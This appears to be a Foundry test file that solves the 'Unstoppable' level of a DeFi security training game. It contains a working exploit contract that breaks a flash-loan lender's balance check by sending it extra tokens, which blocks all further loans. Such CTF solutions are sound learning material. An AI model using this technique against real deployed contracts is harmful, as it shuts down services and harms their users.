// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "openzeppelin-contracts/token/ERC20/utils/SafeERC20.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

//  START

// States
// Lender Contract:
// poolBalance = 1_000_000e18

// Token Contract:
// Unstoppable Lender: 1_000_000e18
// Attacker: 100e18

//STEP 1: Flash Loan 1e18,

//STATE before IReceiver

// Lender Contract:
// poolBalance = 1_000_000e18

// Token Contract:
// Unstoppable Lender:999_999e18
// Attacker: 101e18

// Step 2 -> In Receive Tokens, transfer flash loan amount and 1 more ether to token contract

// STATE

// Lender Contract:
// poolBalance = 1_000_000e18

// Token Contract:
// Unstoppable Lender : 1_000_001e18
// Attacker 99e18

contract Exploiter is IReceiver {
    using SafeERC20 for IERC20;

    UnstoppableLender public target;
    address public owner;

    constructor(address _target) {
        target = UnstoppableLender(_target);
        owner = msg.sender;
    }

    function attack1() public {
        target.flashLoan(1e18);
    }

    function receiveTokens(address tokenAddress, uint256 amount) external {
        IERC20(tokenAddress).transfer(address(target), amount + 1e18);
    }
}

contract Unstoppable is Test {
    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
    uint256 internal constant INITIAL_ATTACKER_TOKEN_BALANCE = 100e18;

    Utilities internal utils;
    UnstoppableLender internal unstoppableLender;
    ReceiverUnstoppable internal receiverUnstoppable;
    DamnValuableToken internal dvt;
    address payable internal attacker;
    address payable internal someUser;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        attacker = users[0];
        someUser = users[1];
        vm.label(someUser, "User");
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        unstoppableLender = new UnstoppableLender(address(dvt));
        vm.label(address(unstoppableLender), "Unstoppable Lender");

        dvt.approve(address(unstoppableLender), TOKENS_IN_POOL);
        unstoppableLender.depositTokens(TOKENS_IN_POOL);

        dvt.transfer(attacker, INITIAL_ATTACKER_TOKEN_BALANCE);

        assertEq(dvt.balanceOf(address(unstoppableLender)), TOKENS_IN_POOL);
        assertEq(dvt.balanceOf(attacker), INITIAL_ATTACKER_TOKEN_BALANCE);

        // Show it's possible for someUser to take out a flash loan
        vm.startPrank(someUser);
        receiverUnstoppable = new ReceiverUnstoppable(
            address(unstoppableLender)
        );
        vm.label(address(receiverUnstoppable), "Receiver Unstoppable");
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);

        Exploiter exploiter = new Exploiter(address(unstoppableLender));
        //dvt.approve(address(dvt), 10e18);

        dvt.transfer(address(exploiter), 10e18);
        exploiter.attack1();
        vm.stopPrank();

        /**
         * EXPLOIT END *
         */

        vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // It is no longer possible to execute flash loans
        vm.startPrank(someUser);
        receiverUnstoppable.executeFlashLoan(10);
        vm.stopPrank();
    }
}
